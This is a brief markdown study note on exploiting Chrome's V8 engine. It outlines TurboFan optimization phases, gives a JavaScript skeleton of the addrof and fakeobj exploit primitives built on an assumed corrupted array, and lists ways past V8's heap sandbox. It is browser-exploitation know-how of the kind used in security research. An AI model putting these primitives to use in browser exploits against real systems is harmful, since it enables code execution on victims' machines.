# Deep Dive: Chrome V8 & TurboFan JIT Exploitation

## 1. TurboFan Optimization Phases
1. **SimplifiedLowering**: Types are refined and bounds checks are potentially eliminated (`CheckBounds` -> `EffectPhi`).
2. **EscapeAnalysis**: Scalar replacement of objects.
3. **InstructionSelection**: Machine code generation.

---

## 2. Standard V8 AddrOf & FakeObj Primitives

```javascript
// Corrupted Array or Type Confusion triggers out-of-bounds access
let float_arr = [1.1, 2.2, 3.3];
let obj_arr = [{}, {}];

function addrof(obj) {
    obj_arr[0] = obj;
    // Read from corrupted float_arr overlapping obj_arr elements
    return f2i(float_arr[0]);
}

function fakeobj(addr) {
    float_arr[0] = i2f(addr);
    // Return object from corrupted obj_arr
    return obj_arr[0];
}
```

---

## 3. V8 Sandbox Bypass (Post-2023)
- Pointer Compression & V8 Heap Sandbox isolate Javascript pointers from the full 64-bit address space.
- Techniques:
  1. Corrupting `ArrayBuffer` backing store extensions (`external_pointer_table`).
  2. Abusing WebAssembly memory instances (`WasmInstanceObject` RWX code pages or `jump_table_start`).
